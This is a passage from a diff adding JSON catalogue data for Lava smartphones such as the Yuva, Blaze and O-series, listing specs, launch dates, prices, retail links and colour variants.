+                "name": "Sparkling Ivory",
+                "image": "media/images/product-variant/image_path/bold-n1-listing1-1749128851.webp",
+                "thumbnail": null,
+                "color_code": "#f0eadd",
+                "product_id": 115
+              }
+            ]
+          },
+          {
+            "id": 112,
+            "name": "Yuva Star 2",
+            "slug": "yuva-star-2",
+            "status": 1,
+            "image": "media/community/image/yuva-star-2-listing1-1749129467.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Octa-core Processor | 17.15cm (6.75\") HD+ Display  | 13MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10W Charging | IP54 Dust and Water Resistant",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2025-05-07T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 5,
+            "read_more_url": null,
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 1150,
+                "name": "Radiant Black",
+                "image": "media/images/product-variant/image_path/yuva-star-2-listing1-1749129416.webp",
+                "thumbnail": null,
+                "color_code": "#0e141b",
+                "product_id": 112
+              },
+              {
+                "id": 1151,
+                "name": "Sparkling Ivory",
+                "image": "media/images/product-variant/image_path/yuva-star-2-listing-1749129538.webp",
+                "thumbnail": null,
+                "color_code": "#f0eadd",
+                "product_id": 112
+              }
+            ]
+          },
+          {
+            "id": 111,
+            "name": "Blaze Amoled",
+            "slug": "blaze-amoled",
+            "status": 1,
+            "image": "media/community/image/blaze-amoled-listing-1745220481.webp",
+            "thumbnail_image": null,
+            "short_description": "3D Curved AMOLED Display | 64MP Sony Sensor Camera & 16MP Selfie Camera | 16.94cm(6.67\") 120Hz Punch Hole Display | Lightning Fast Performance with MediaTek Dimensity 6300 Chipset | 4GB+4GB*I 6GB+6GB* I 8GB+8GB* RAM  l 128GB UFS 2.2 Memory",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2025-04-21T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 3,
+            "read_more_url": null,
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": []
+          },
+          {
+            "id": 110,
+            "name": "BOLD 5G",
+            "slug": "bold-5g",
+            "status": 1,
+            "image": "media/community/image/bold-5g-listing-1744047425.webp",
+            "thumbnail_image": null,
+            "short_description": "Segment First 3D Curved AMOLED Display | IP64 Dust & Water Resistant | 64MP Sony Sensor Camera & 16MP Selfie Camera | 16.94cm(6.67\") 120Hz Punch Hole Display | Lightning Fast Performance with MediaTek Dimensity 6300 Chipset",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2025-04-07T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1024,
+            "read_more_url": null,
+            "amazon_link": "https://www.amazon.in/dp/B0F1N1KN2K",
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": []
+          },
+          {
+            "id": 109,
+            "name": "Shark",
+            "slug": "shark",
+            "status": 1,
+            "image": "media/community/image/shark-listing-1743513537.webp",
+            "thumbnail_image": null,
+            "short_description": "50MP AI Rear Camera | 8MP Selfie Camera | 4GB+4GB* RAM  | 64GB ROM | Octa-core UNISOC T606 Processor | 16.94cm (6.67\") HD+ Punch Hole Display  | 120Hz Refresh Rate | \r\n5000mAh Battery with Type-C Port & 10W Charging (18W Fast Charging Support)",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2025-04-01T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1023,
+            "read_more_url": null,
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": []
+          },
+          {
+            "id": 103,
+            "name": "O3",
+            "slug": "o3",
+            "status": 1,
+            "image": "media/community/image/o3-listing-1741590288.webp",
+            "thumbnail_image": null,
+            "short_description": "3GB+3GB* | 4GB+4GB* RAM  l 64GB ROM | Octa-core Processor | 17.15cm (6.75\") HD+ Notch Display | 13MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10W Charging",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2025-03-10T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 13,
+            "read_more_url": null,
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 1144,
+                "name": "Glossy Lavender",
+                "image": "media/images/product-variant/image_path/o3-listing-1741590366.webp",
+                "thumbnail": null,
+                "color_code": "#c8c2ea",
+                "product_id": 103
+              },
+              {
+                "id": 1145,
+                "name": "Glossy White",
+                "image": "media/images/product-variant/image_path/o3-listing-white-1741590412.webp",
+                "thumbnail": null,
+                "color_code": "#ffffff",
+                "product_id": 103
+              },
+              {
+                "id": 1146,
+                "name": "Glossy Blue",
+                "image": "media/images/product-variant/image_path/o3-listing-black-1741590470.webp",
+                "thumbnail": null,
+                "color_code": "#0b1222",
+                "product_id": 103
+              },
+              {
+                "id": 1147,
+                "name": "Glossy Black",
+                "image": "media/images/product-variant/image_path/o3-black-listing-1741608431.webp",
+                "thumbnail": null,
+                "color_code": "#000000",
+                "product_id": 103
+              }
+            ]
+          },
+          {
+            "id": 99,
+            "name": "Yuva Smart",
+            "slug": "yuva-smart",
+            "status": 1,
+            "image": "media/community/image/yuva-smart-listing-1739854213.webp",
+            "thumbnail_image": null,
+            "short_description": "3GB+3GB* RAM  l 64GB ROM | Octa-core Processor | 17.15cm (6.75\") HD+ Notch Display | 13MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10W Charging",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2025-01-10T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 5,
+            "read_more_url": "smartphones/yuva-smart",
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": []
+          },
+          {
+            "id": 98,
+            "name": "Yuva 2 5G",
+            "slug": "yuva-2-5g",
+            "status": 1,
+            "image": "media/community/image/yuva-2-5g-listing-1735282293.webp",
+            "thumbnail_image": null,
+            "short_description": "700nits HBM 90Hz HD+ Punch Hole Display | Segment-first Notification Light | UNISOC T760 Octa-core Processor | 4GB+4GB* LPDDR4X RAM  l 128GB UFS2.2 ROM",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2024-12-27T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 5,
+            "read_more_url": "smartphones/yuva-2-5g",
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 1142,
+                "name": "Marble Black",
+                "image": "media/images/product-variant/image_path/yuva-2-5g-listing-color1-1735289763.webp",
+                "thumbnail": null,
+                "color_code": "#000000",
+                "product_id": 98
+              },
+              {
+                "id": 1143,
+                "name": "Marble White",
+                "image": "media/images/product-variant/image_path/yuva-2-5g-listing-color2-1735289807.webp",
+                "thumbnail": null,
+                "color_code": "#fcfcfc",
+                "product_id": 98
+              }
+            ]
+          },
+          {
+            "id": 96,
+            "name": "Blaze Duo 5G",
+            "slug": "blaze-duo",
+            "status": 1,
+            "image": "media/community/image/blaze-duo-listing-1733894159.webp",
+            "thumbnail_image": null,
+            "short_description": "4.02cm (1.58\") Secondary AMOLED Display | 3D Curved AMOLED | 64MP Sony Sensor Rear Camera & 16MP Selfie Camera | 6GB+6GB*/ 8GB+8GB* LPDDR5 RAM l 128GB UFS 3.1 ROM | Lightning-fast Performance with MediaTek Dimensity 7025 Chipset | 16.94 cm (6.67\") 120Hz Punch Hole Display | 5000mAh Battery with Type-C Port & 33W Fast Charging",
+            "description": null,
+            "price": 18999,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2024-12-12T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 3,
+            "read_more_url": "smartphones/blaze-duo",
+            "amazon_link": "https://www.amazon.in/dp/B0DNMP3724?ie=UTF8&ref_=Brand_Lava_BlazeDuo_Google",
+            "buy_now_url": "https://shop.lavamobiles.com/products/blaze-duo",
+            "cut_price": 16999,
+            "thumbnail_variant": [
+              {
+                "id": 1135,
+                "name": "Celestial Blue",
+                "image": "media/images/product-variant/image_path/blaze-duo-listing-celestial-blue-1733894243.webp",
+                "thumbnail": null,
+                "color_code": "#1b344e",
+                "product_id": 96
+              },
+              {
+                "id": 1136,
+                "name": "Artic White",
+                "image": "media/images/product-variant/image_path/blaze-duo-listing-artic-white-1733894292.webp",
+                "thumbnail": null,
+                "color_code": "#fcfcfc",
+                "product_id": 96
+              }
+            ]
+          },
+          {
+            "id": 93,
+            "name": "Yuva 4",
+            "slug": "yuva-4",
+            "status": 1,
+            "image": "media/community/image/yuva-4-listing-1732879416.webp",
+            "thumbnail_image": null,
+            "short_description": "50MP AI Triple Rear Camera I 8MP Selfie Camera | 4GB+4GB* RAM  l 64GB/128GB ROM | Octa-core UNISOC T606 Processor | 16.55cm (6.56\") HD+ Punch Hole Display",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2024-11-30T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 5,
+            "read_more_url": "/smartphones/yuva-4",
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 1132,
+                "name": "Glossy Purple",
+                "image": "media/images/product-variant/image_path/yuva-4-listing-color1-1732879703.webp",
+                "thumbnail": null,
+                "color_code": "#1c1332",
+                "product_id": 93
+              },
+              {
+                "id": 1133,
+                "name": "Glossy Black",
+                "image": "media/images/product-variant/image_path/yuva-4-listing-color2-1732879765.webp",
+                "thumbnail": null,
+                "color_code": "#07080a",
+                "product_id": 93
+              },
+              {
+                "id": 1134,
+                "name": "Glossy White",
+                "image": "media/images/product-variant/image_path/yuva-4-listing-color3-1732879827.webp",
+                "thumbnail": null,
+                "color_code": "#ffffff",
+                "product_id": 93
+              }
+            ]
+          },
+          {
+            "id": 88,
+            "name": "Blaze 3 5G",
+            "slug": "blaze-3-5g",
+            "status": 1,
+            "image": "media/community/image/blaze-3-5g-listing-1726467349.webp",
+            "thumbnail_image": null,
+            "short_description": "Segment First VIBE Light | Lightning Fast Performance with MediaTek Dimensity 6300 Chipset | 6GB+6GB* RAM  l 128GB UFS 2.2 Memory",
+            "description": null,
+            "price": 12999,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2024-09-16T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 3,
+            "read_more_url": "smartphones/blaze-3-5g",
+            "amazon_link": "https://www.amazon.in/dp/B0DFC1HFDM",
+            "buy_now_url": "https://shop.lavamobiles.com/products/blaze-3-5g",
+            "cut_price": 11499,
+            "thumbnail_variant": [
+              {
+                "id": 1125,
+                "name": "Glass Blue",
+                "image": "media/images/product-variant/image_path/blaze-3-5g-listing-color1-1726470670.webp",
+                "thumbnail": null,
+                "color_code": "#0b1322",
+                "product_id": 88
+              },
+              {
+                "id": 1126,
+                "name": "Glass Gold",
+                "image": "media/images/product-variant/image_path/blaze-3-5g-listing-color2-1726470685.webp",
+                "thumbnail": null,
+                "color_code": "#d9d6c9",
+                "product_id": 88
+              }
+            ]
+          },
+          {
+            "id": 82,
+            "name": "Blaze X",
+            "slug": "blaze-x",
+            "status": 1,
+            "image": "media/community/image/blaze-x-listing-1722839324.webp",
+            "thumbnail_image": null,
+            "short_description": "Segment First 3D Curved AMOLED Display | 64MP Sony Sensor Camera & 16MP Selfie Camera | 16.94cm(6.67\") 120Hz Punch Hole Display | Lightning Fast Performance with MediaTek Dimensity 6300 Chipset",
+            "description": null,
+            "price": 16999,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2024-07-10T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 3,
+            "read_more_url": "smartphones/blaze-x",
+            "amazon_link": "https://www.amazon.in/dp/B0D7M81CJX?ie=UTF8&ref_=Brand_Lava_BlazeX_BrandOtherDigital",
+            "buy_now_url": "https://shop.lavamobiles.com/products/blaze-x",
+            "cut_price": 14999,
+            "thumbnail_variant": [
+              {
+                "id": 1114,
+                "name": "StarLight Purple",
+                "image": "media/images/product-variant/image_path/blaze-x-listing-1722839541.webp",
+                "thumbnail": null,
+                "color_code": "#636688",
+                "product_id": 82
+              },
+              {
+                "id": 1115,
+                "name": "Titanium Grey",
+                "image": "media/images/product-variant/image_path/blaze-x-listing1-1722839477.webp",
+                "thumbnail": null,
+                "color_code": "#d3cfcc",
+                "product_id": 82
+              }
+            ]
+          },
+          {
+            "id": 81,
+            "name": "Yuva 5G",
+            "slug": "yuva-5g",
+            "status": 1,
+            "image": "media/community/image/yuva-5g-1719915336.webp",
+            "thumbnail_image": null,
+            "short_description": "Lightning-fast Performance UNISOC T750 5G Processor | 16.58cm (6.528\") 90Hz Punch Hole Display | 4GB+4GB* RAM l 64/128GB UFS 2.2 ROM |",
+            "description": null,
+            "price": 11499,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2024-05-30T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 5,
+            "read_more_url": "smartphones/yuva-5g",
+            "amazon_link": null,
+            "buy_now_url": "https://shop.lavamobiles.com/products/lava-yuva_5g",
+            "cut_price": 9499,
+            "thumbnail_variant": [
+              {
+                "id": 1112,
+                "name": "Mystic Blue",
+                "image": "media/images/product-variant/image_path/yuva-5g-1719923564.webp",
+                "thumbnail": null,
+                "color_code": "#20354a",
+                "product_id": 81
+              },
+              {
+                "id": 1113,
+                "name": "Mystic Green",
+                "image": "media/images/product-variant/image_path/yuva-5g-green-1719923583.webp",
+                "thumbnail": null,
+                "color_code": "#114b4d",
+                "product_id": 81
+              }
+            ]
+          },
+          {
+            "id": 74,
+            "name": "O2",
+            "slug": "o2",
+            "status": 1,
+            "image": "media/community/image/o2-1712127503.webp",
+            "thumbnail_image": null,
+            "short_description": "8GB+ 8GB* RAM / 128GB UFS 2.2 ROM | Octa-core UNISOC T616 Processor (AnTuTu 280K+) | 50MP Dual AI Rear Camera and 8MP selfie camera | 90Hz 16.55cm (6.5\") HD+ Punch Hole Display\r\nPremium AG Glass Back Finish with Side Fingerprint Sensor\r\n\"18W Fast Charging with \r\nType-C USB Cable\"",
+            "description": null,
+            "price": 9999,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2024-03-22T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 13,
+            "read_more_url": "smartphones/o2",
+            "amazon_link": "https://amzn.to/498GKH7",
+            "buy_now_url": null,
+            "cut_price": 7999,
+            "thumbnail_variant": [
+              {
+                "id": 1102,
+                "name": "Imperial Green",
+                "image": "media/images/product-variant/image_path/o2-1712141597.webp",
+                "thumbnail": null,
+                "color_code": "#88b7bc",
+                "product_id": 74
+              },
+              {
+                "id": 1103,
+                "name": "Majestic Purple",
+                "image": "media/images/product-variant/image_path/03-1712141623.webp",
+                "thumbnail": null,
+                "color_code": "#9a91ab",
+                "product_id": 74
+              },
+              {
+                "id": 1104,
+                "name": "Royal Gold",
+                "image": "media/images/product-variant/image_path/01-1712141550.webp",
+                "thumbnail": null,
+                "color_code": "#f4e3d3",
+                "product_id": 74
+              }
+            ]
+          },
+          {
+            "id": 73,
+            "name": "Blaze Curve",
+            "slug": "blaze-curve",
+            "status": 1,
+            "image": "media/community/image/blaze-curve-list-1710309788.webp",
+            "thumbnail_image": null,
+            "short_description": "16.94 cm (6.67\") 120 Hz Punch Hole 3D Curved Amoled Display with Widevine L1 support | Lightning Fast Processor MTK D7050 | 128GB/256 ROM & (8+8) GB UFS 3.1 RAM",
+            "description": null,
+            "price": 20999,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2024-03-05T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 3,
+            "read_more_url": "smartphones/blaze-curve",
+            "amazon_link": "https://amzn.to/3PePXqo",
+            "buy_now_url": "https://bit.ly/3VcPA3f",
+            "cut_price": 17999,
+            "thumbnail_variant": [
+              {
+                "id": 1100,
+                "name": "Iron Glass",
+                "image": "media/images/product-variant/image_path/color_thumb_2_100x100-1710311082.webp",
+                "thumbnail": null,
+                "color_code": "#52575d",
+                "product_id": 73
+              },
+              {
+                "id": 1101,
+                "name": "Viridian Glass",
+                "image": "media/images/product-variant/image_path/color_thumb_1_100x100-1710311141.webp",
+                "thumbnail": null,
+                "color_code": "#7c999d",
+                "product_id": 73
+              }
+            ]
+          },
+          {
+            "id": 72,
+            "name": "Yuva 3",
+            "slug": "yuva-3",
+            "status": 1,
+            "image": "media/community/image/yuva-3-3-1708940691-1710409248.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB+ 4GB* RAM I 128GB UFS 2.2 ROM | UNISOC T606 Octa-core Processor (AnTuTu 200K+) | 90Hz 16.55cm (6.5\") HD+ Punch Hole Display",
+            "description": null,
+            "price": 7999,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2024-02-04T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 5,
+            "read_more_url": "smartphones/yuva-3",
+            "amazon_link": null,
+            "buy_now_url": "https://shop.lavamobiles.com/products/yuva-3?variant=48089584238902",
+            "cut_price": 6999,
+            "thumbnail_variant": [
+              {
+                "id": 1097,
+                "name": "Eclipse Black",
+                "image": "media/images/product-variant/image_path/yuva-3-3-1708940691.webp",
+                "thumbnail": null,
+                "color_code": "#000000",
+                "product_id": 72
+              },
+              {
+                "id": 1098,
+                "name": "Cosmic Lavender",
+                "image": "media/images/product-variant/image_path/yuva-3-1708940729.webp",
+                "thumbnail": null,
+                "color_code": "#c7c9e4",
+                "product_id": 72
+              },
+              {
+                "id": 1099,
+                "name": "Galaxy White",
+                "image": "media/images/product-variant/image_path/yuva-3-1-1708940826.webp",
+                "thumbnail": null,
+                "color_code": "#efefef",
+                "product_id": 72
+              }
+            ]
+          },
+          {
+            "id": 69,
+            "name": "Yuva 3 Pro",
+            "slug": "yuva-3-pro",
+            "status": 1,
+            "image": "media/community/image/yuva-3-pro-1-thumb-1703747999.webp",
+            "thumbnail_image": null,
+            "short_description": "8GB+ 8GB* RAM / 128GB UFS 2.2 ROM | UNISOC T616 Octa-core Processor (AnTuTu 250K+) | 50MP Dual AI Rear Camera and 8MP selfie camera |",
+            "description": null,
+            "price": 9999,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2023-12-14T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 5,
+            "read_more_url": "smartphones/yuva-3-pro",
+            "amazon_link": null,
+            "buy_now_url": "https://shop.lavamobiles.com/products/yuva-3-pro?variant=47574649110838",
+            "cut_price": 7999,
+            "thumbnail_variant": [
+              {
+                "id": 91,
+                "name": "Yuva 3 Pro",
+                "image": "media/images/product-variant/image_path/yuva-3-pro-1-thumb-1703748029.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/yuva-3-pro-1-thumb-1703748029.webp",
+                "color_code": "#858096",
+                "product_id": 69
+              },
+              {
+                "id": 92,
+                "name": "Yuva 3 Pro-1",
+                "image": "media/images/product-variant/image_path/yuva-3-pro-2-thumb-1703748070.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/yuva-3-pro-2-thumb-1703748070.webp",
+                "color_code": "#f8eee4",
+                "product_id": 69
+              },
+              {
+                "id": 93,
+                "name": "Green",
+                "image": "media/images/product-variant/image_path/yuva-3-pro-3-thumb-1703748144.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/yuva-3-pro-3-thumb-1703748144.webp",
+                "color_code": "#5d7c81",
+                "product_id": 69
+              }
+            ]
+          },
+          {
+            "id": 67,
+            "name": "Blaze 2 5G",
+            "slug": "blaze-2-5g",
+            "status": 1,
+            "image": "media/community/image/blaze-2-5g-3-thumb-1703747458.webp",
+            "thumbnail_image": null,
+            "short_description": "1st in the Segment Ring Light & Premium Glass Back Design | 16.55cm (6.56\") 90Hz Punch Hole Display | Lightning-fast Performance MediaTek Dimensity 6020 Processor",
+            "description": null,
+            "price": 12499,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2023-11-02T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 3,
+            "read_more_url": "smartphones/blaze-2-5g",
+            "amazon_link": null,
+            "buy_now_url": "https://shop.lavamobiles.com/products/blaze-2-5g?utm_source=website&utm_medium=blaze-2-5g&utm_campaign=buy-now&variant=47364024795446",
+            "cut_price": 10999,
+            "thumbnail_variant": [
+              {
+                "id": 85,
+                "name": "Blaze 2 5G",
+                "image": "media/images/product-variant/image_path/blaze-2-5g-3-thumb-1703747591.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-2-5g-3-thumb-1703747591.webp",
+                "color_code": "#b5b0d0",
+                "product_id": 67
+              },
+              {
+                "id": 86,
+                "name": "Blaze 2 5G-1",
+                "image": "media/images/product-variant/image_path/blaze-2-5g-1-thumb-1703747633.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-2-5g-1-thumb-1703747634.webp",
+                "color_code": "#101010",
+                "product_id": 67
+              },
+              {
+                "id": 87,
+                "name": "Blaze 2 5G-2",
+                "image": "media/images/product-variant/image_path/blaze-2-5g-2-thumb-1703747687.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-2-5g-2-thumb-1703747687.webp",
+                "color_code": "#92a7bc",
+                "product_id": 67
+              }
+            ]
+          },
+          {
+            "id": 68,
+            "name": "O1",
+            "slug": "o1",
+            "status": 1,
+            "image": "media/community/image/o1-1-thumb-1703747797.webp",
+            "thumbnail_image": null,
+            "short_description": "16.66cm (6.56\") 90Hz Display | (4GB+ 3GB*) RAM + 64GB ROM | 5000mAh battery with Type-C Port & 18W Fast Charger |",
+            "description": null,
+            "price": 8999,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2023-10-21T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 13,
+            "read_more_url": "smartphones/o1",
+            "amazon_link": null,
+            "buy_now_url": "https://www.amazon.in/Lava-Lavender-Charging-Expandable-Fingerprint/dp/B0C7BSVVYX/ref=sr_1_3?crid=5FEM7XI4ISD",
+            "cut_price": 6999,
+            "thumbnail_variant": [
+              {
+                "id": 88,
+                "name": "O1",
+                "image": "media/images/product-variant/image_path/o1-1-thumb-1703747829.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/o1-1-thumb-1703747829.webp",
+                "color_code": "#c8effe",
+                "product_id": 68
+              },
+              {
+                "id": 89,
+                "name": "O1-2",
+                "image": "media/images/product-variant/image_path/o1-2-thumb-1703747859.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/o1-2-thumb-1703747859.webp",
+                "color_code": "#bc2023",
+                "product_id": 68
+              },
+              {
+                "id": 90,
+                "name": "O1-3",
+                "image": "media/images/product-variant/image_path/o1-3-thumb-1703747920.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/o1-3-thumb-1703747920.webp",
+                "color_code": "#ab87d5",
+                "product_id": 68
+              }
+            ]
+          },
+          {
+            "id": 66,
+            "name": "Blaze Pro 5G",
+            "slug": "blaze-pro-5g",
+            "status": 1,
+            "image": "media/community/image/blaze-pro-5g-1-thumb-1703747210.webp",
+            "thumbnail_image": null,
+            "short_description": "Ultra-fast Processor MediaTek D6020 | 8GB+8GB* RAM l 128GB ROM | 50MP Rear Camera with EIS Support |",
+            "description": null,
+            "price": 14999,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2023-09-26T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 3,
+            "read_more_url": "smartphones/blaze-pro-5g",
+            "amazon_link": null,
+            "buy_now_url": "https://shop.lavamobiles.com/products/blaze_pro_5g?variant=47020573294902",
+            "cut_price": 12999,
+            "thumbnail_variant": [
+              {
+                "id": 83,
+                "name": "Blaze Pro 5G",
+                "image": "media/images/product-variant/image_path/blaze-pro-5g-1-thumb-1703747308.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-pro-5g-1-thumb-1703747308.webp",
+                "color_code": "#d9e3e8",
+                "product_id": 66
+              },
+              {
+                "id": 84,
+                "name": "Blaze Pro 5G-1",
+                "image": "media/images/product-variant/image_path/blaze-pro-5g-thumb-1703747376.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-pro-5g-thumb-1703747376.webp",
+                "color_code": "#475668",
+                "product_id": 66
+              }
+            ]
+          },
+          {
+            "id": 30,
+            "name": "Blaze 2 Pro",
+            "slug": "blaze-2-pro",
+            "status": 1,
+            "image": "media/community/image/blaze-2-pro-3-thumb-1703588106.webp",
+            "thumbnail_image": null,
+            "short_description": "Ultra-fast UNISOC T616 Processor | 8GB+8GB* RAM I 128GB ROM | 50MP AI Triple Rear Camera |",
+            "description": "<p>Ultra-fast UNISOC T616 Processor | 8GB+8GB* RAM I 128GB ROM | 50MP AI Triple Rear Camera |</p>",
+            "price": 12499,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2023-09-05T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 3,
+            "read_more_url": "smartphones/blaze-2-pro",
+            "amazon_link": null,
+            "buy_now_url": "https://shop.lavamobiles.com/products/blaze-2-5g?utm_source=website",
+            "cut_price": 10999,
+            "thumbnail_variant": [
+              {
+                "id": 50,
+                "name": "Blaze 2 Pro-1",
+                "image": "media/images/product-variant/image_path/blaze-2-pro-black-1705665636.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-2-pro-3-thumb-1703595866.webp",
+                "color_code": "#151d28",
+                "product_id": 30
+              },
+              {
+                "id": 51,
+                "name": "Blaze 2 Pro-2",
+                "image": "media/images/product-variant/image_path/blaze-2-pro-2-thumb-1703595881.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-2-pro-2-thumb-1703595881.webp",
+                "color_code": "#bbeab6",
+                "product_id": 30
+              },
+              {
+                "id": 52,
+                "name": "Blaze 2 Pro-3",
+                "image": "media/images/product-variant/image_path/blaze-2-pro-1-1705665618.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/blaze-2-pro-1-thumb-1703595893.webp",
+                "color_code": "#6895b4",
+                "product_id": 30
+              }
+            ]
+          },
+          {
+            "id": 36,
+            "name": "Yuva 2",
+            "slug": "yuva-2",
+            "status": 1,
+            "image": "media/community/image/yuva-2-1-thumb-1703588800.webp",
+            "thumbnail_image": null,
+            "short_description": "(3GB+ 3GB*) RAM + 64GB ROM | Unisoc T606 Octa-core Processor | 13MP Dual AI Rear Camera |",
+            "description": "<p>(3GB+ 3GB*) RAM + 64GB ROM | Unisoc T606 Octa-core Processor | 13MP Dual AI Rear Camera |</p>",
+            "price": 8499,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2023-08-02T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 5,
+            "read_more_url": "smartphones/yuva-2",
+            "amazon_link": null,
+            "buy_now_url": "https://shop.lavamobiles.com/products/yuva2?variant=45829641175350",
+            "cut_price": 6999,
+            "thumbnail_variant": [
+              {
+                "id": 65,
+                "name": "Yuva 2-1",
+                "image": "media/images/product-variant/image_path/yuva-2-1-thumb-1703596391.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/yuva-2-1-thumb-1703596391.webp",
+                "color_code": "#9195ba",
+                "product_id": 36
+              },
+              {
+                "id": 66,
+                "name": "Yuva 2-2",
+                "image": "media/images/product-variant/image_path/yuva-2-thumb-1703596404.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/yuva-2-thumb-1703596404.webp",
+                "color_code": "#95b2c0",
+                "product_id": 36
+              },
+              {
+                "id": 97,
+                "name": "Yuva 2-3",
+                "image": "media/images/product-variant/image_path/yuva-2-1705493799.webp",
+                "thumbnail": null,
+                "color_code": "#badfbe",
+                "product_id": 36
+              }
+            ]
+          },
+          {
+            "id": 3,
+            "name": "Yuva",
+            "slug": "yuva",
+            "status": 1,
+            "image": "media/community/image/yuva-2-thumb-1703603697.webp",
+            "thumbnail_image": "media/community/thumbnail_image/color2-1702533637.webp",
+            "short_description": "MediaTek Helio G25 OctaCore Processor | 8MP Dual Camera + 5MP Selfie Camera | Finger Print Sensor + Face Unlock |",
+            "description": "<p>MediaTek Helio G25 OctaCore Processor | 8MP Dual Camera + 5MP Selfie Camera | Finger Print Sensor + Face Unlock |</p>",
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2023-05-25T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 5,
+            "read_more_url": "smartphones/yuva",
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 12,
+                "name": "Yuva-1",
+                "image": "media/images/product-variant/image_path/yuva-2-thumb-1703596346.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/yuva-2-thumb-1703596346.webp",
+                "color_code": "#aad2c9",
+                "product_id": 3
+              },
+              {
+                "id": 64,
+                "name": "Yuva-2",
